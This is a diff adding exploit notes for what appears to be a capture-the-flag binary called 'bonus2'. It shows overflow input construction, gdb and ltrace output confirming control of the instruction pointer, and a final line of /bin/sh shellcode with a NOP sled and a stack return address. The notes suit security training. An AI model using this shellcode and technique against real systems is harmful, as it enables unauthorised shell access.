@@ -1,0 +1,16 @@
+
+
+python -c "print('b'* 26)" > /tmp/lua2b
+
+python -c "print('a' * 30 + 'AABB' + 6 * 'c')" > /tmp/lua2a
+
+gdb -ex run --args ./bonus2 $(cat /tmp/lua2a) $(cat /tmp/lua2b)
+    Program received signal SIGSEGV, Segmentation fault.
+    0x42424141 in ?? ()
+
+export LANG=$(cat /tmp/lua2a)
+
+ltrace ./bonus2 $(cat /tmp/lua2a) $(cat /tmp/lua2b)
+    strncpy(0xbffff680, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAA"..., 40)        = 0xbffff680
+
+(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 5 * '\x90' + '\x80\xf6\xff\xbf' + 6 * 'x' )" > /tmp/lua2a
